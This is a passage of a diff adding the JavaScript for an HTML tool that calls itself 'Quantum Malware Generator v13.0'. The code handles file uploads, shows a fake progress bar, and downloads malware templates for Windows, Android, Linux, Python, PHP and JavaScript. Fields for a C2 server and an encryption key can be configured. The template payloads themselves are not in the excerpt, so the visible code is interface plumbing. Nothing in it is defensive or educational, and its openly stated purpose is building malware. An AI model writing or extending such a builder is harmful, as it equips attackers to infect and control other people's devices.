+            dropZone.classList.remove('dragover');
+            
+            const files = Array.from(e.dataTransfer.files);
+            handleFiles(files);
+        });
+        
+        fileInput.addEventListener('change', (e) => {
+            const files = Array.from(e.target.files);
+            handleFiles(files);
+        });
+
+        function handleFiles(files) {
+            loadedFiles = [...loadedFiles, ...files];
+            document.getElementById('filesLoaded').textContent = loadedFiles.length;
+            
+            // Update file info
+            const info = files.map(f => `${f.name} (${(f.size/1024).toFixed(2)} KB)`).join('<br>');
+            fileInfo.innerHTML = info;
+            
+            files.forEach(file => {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    addTerminalLine(`Loaded: ${file.name} (${(file.size/1024).toFixed(2)} KB)`, 'command');
+                    
+                    // If it's a code file, add to custom code
+                    if (file.name.endsWith('.py') || file.name.endsWith('.js') || file.name.endsWith('.php')) {
+                        document.getElementById('customCode').value = e.target.result;
+                    }
+                };
+                reader.readAsText(file);
+            });
+        }
+
+        // Generate Malware
+        function generateMalware() {
+            if (!selectedMalware) {
+                alert('Please select a malware type first!');
+                return;
+            }
+            
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+            
+            progressBar.style.display = 'block';
+            let progress = 0;
+            
+            const interval = setInterval(() => {
+                progress += 10;
+                progressFill.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        progressBar.style.display = 'none';
+                        progressFill.style.width = '0%';
+                        completeGeneration();
+                    }, 500);
+                }
+            }, 200);
+            
+            addTerminalLine('⚡ Generating malware...', 'command');
+        }
+
+        function completeGeneration() {
+            generatedCount++;
+            document.getElementById('generatedCount').textContent = generatedCount;
+            
+            const { platform, type } = selectedMalware;
+            const code = malwareTemplates[platform]?.[type] || '// Template not found';
+            const malwareName = document.getElementById('malwareName').value || 'quantum_payload';
+            
+            // Create blob and download
+            const blob = new Blob([code], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${malwareName}.${getExtension(platform, type)}`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            addTerminalLine(`✅ Generated: ${malwareName}.${getExtension(platform, type)}`, 'command');
+            showToast(`Malware generated successfully!`);
+        }
+
+        function getExtension(platform, type) {
+            const extensions = {
+                windows: 'exe',
+                android: 'apk',
+                linux: 'bin',
+                python: 'py',
+                php: 'php',
+                javascript: 'js'
+            };
+            return extensions[platform] || 'txt';
+        }
+
+        function clearAll() {
+            loadedFiles = [];
+            document.getElementById('filesLoaded').textContent = '0';
+            fileInfo.innerHTML = '';
+            document.getElementById('customCode').value = '';
+            document.getElementById('malwareName').value = 'quantum_payload';
+            document.getElementById('c2Server').value = '';
+            document.getElementById('encryptionKey').value = 'quantumv13';
+            
+            addTerminalLine('🔄 Cleared all data', 'command');
+        }
+
+        function addTerminalLine(text, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const line = document.createElement('div');
+            line.className = 'line';
+            line.innerHTML = `<span class="prompt">$></span> <span class="${type}">${text}</span>`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+
+        // Auto-update preview on config change
+        document.getElementById('c2Server').addEventListener('input', updateCodePreview);
+        document.getElementById('encryptionKey').addEventListener('input', updateCodePreview);
+        document.getElementById('malwareName').addEventListener('input', updateCodePreview);
+
+        // Initialize
+        initMalwareList();
+        addTerminalLine('Quantum Malware Generator v13.0 ready', 'command');
+        addTerminalLine('Select a malware type to begin', 'command');
+    </script>
+</body>
+</html>
